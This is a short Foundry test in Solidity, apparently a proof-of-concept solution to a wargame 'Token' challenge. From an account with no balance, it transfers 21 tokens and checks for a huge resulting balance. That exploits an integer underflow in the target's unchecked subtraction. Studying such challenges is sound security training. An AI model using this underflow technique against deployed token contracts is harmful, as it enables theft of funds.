// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;
import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";


contract Token_POC is Test {
    Token _token;
    function init() private{
        vm.startPrank(address(0x1));
        _token =new Token(1_000_000_000*10**18);
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Token_POC() public{
        _token.transfer(address(0x0), 21);
        uint256 thisBalance = _token.balanceOf(address(this));
        console.log("This balance:",thisBalance);
        console.log("success:",thisBalance > 20);
    }
}
